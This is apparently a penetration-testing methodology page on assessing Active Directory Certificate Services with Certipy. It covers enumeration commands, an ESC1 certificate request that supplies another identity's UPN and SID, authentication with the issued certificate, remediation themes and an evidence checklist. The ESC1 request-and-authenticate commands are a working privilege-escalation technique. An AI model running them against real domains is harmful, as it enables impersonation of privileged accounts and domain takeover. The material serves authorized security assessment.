# 🪪 Active Directory Certificate Services and Certipy

> **Last verified:** 2026-09-17  
> **Checked against:** Current Certipy and Microsoft AD CS documentation  
> **Scope:** Authorized Active Directory environments only

Active Directory Certificate Services can turn certificate-template or enrollment misconfigurations into durable domain access. Treat certificate requests and authentication as credential operations and preserve the issued artifacts securely.

## Assessment Workflow

```text
Discover CAs → Enumerate templates → Confirm enrollment rights
→ Validate the exact abuse condition → Request a lab certificate
→ Authenticate only when authorized → Remediate and retest
```

## Install and Record Version

```bash
pipx install certipy-ad
certipy --version
```

## Find Certificate Authorities and Templates

```bash
certipy find \
  -u 'TEST_USER@example.test' \
  -p 'TEST_PASSWORD' \
  -dc-ip 192.0.2.10 \
  -enabled -vulnerable -stdout
```

Exported BloodHound-compatible data can help show ownership and enrollment paths:

```bash
certipy find -u 'TEST_USER@example.test' -p 'TEST_PASSWORD' \
  -dc-ip 192.0.2.10 -enabled -vulnerable -json
```

## What to Validate

- Who can enroll and whether manager approval or authorized signatures are required.
- Whether the requester can supply subject or SAN values.
- Whether the certificate permits client authentication.
- Template and CA ACLs, enrollment-agent permissions, and dangerous ownership.
- HTTP enrollment endpoints and protections against NTLM relay.
- Whether issued certificates remain valid after passwords are rotated.

## Controlled ESC1 Validation

Use a dedicated test identity and request only the minimum certificate needed to demonstrate the configured risk.

```bash
certipy req \
  -u 'TEST_USER@example.test' \
  -p 'TEST_PASSWORD' \
  -dc-ip 192.0.2.10 \
  -target 'ca.example.test' \
  -ca 'EXAMPLE-CA' \
  -template 'VULNERABLE-TEMPLATE' \
  -upn 'APPROVED_TEST_IDENTITY@example.test' \
  -sid 'APPROVED_TEST_IDENTITY_SID'
```

If authentication is in scope:

```bash
certipy auth -pfx approved-test-identity.pfx -dc-ip 192.0.2.10
```

Do not request certificates for real privileged users when a dedicated test identity can demonstrate the same control failure.

## Remediation Themes

- Remove broad enrollment and template-control permissions.
- Disable requester-supplied subject/SAN values unless required.
- Remove client-authentication EKUs from templates that do not need them.
- Require approval or authorized signatures for sensitive enrollment.
- Enable EPA and disable unnecessary HTTP enrollment endpoints.
- Monitor template, CA, and enrollment-policy changes.
- Revoke test certificates and verify publication of revocation information.

## Evidence Checklist

- [ ] CA and template names, object identifiers, and relevant ACLs.
- [ ] Exact enrollment principal and authentication EKUs.
- [ ] Certipy version and sanitized command output.
- [ ] Issued serial number and validity period, without publishing private keys.
- [ ] Revocation and cleanup confirmation.
- [ ] Clear mapping from condition to impact and remediation.

## References

- [Certipy](https://github.com/ly4k/Certipy)
- [Certipy command reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Microsoft AD CS security guidance](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-insecure-adcs-certificate-enrollment)

---

[← AD Attack Methodology](./README.md)
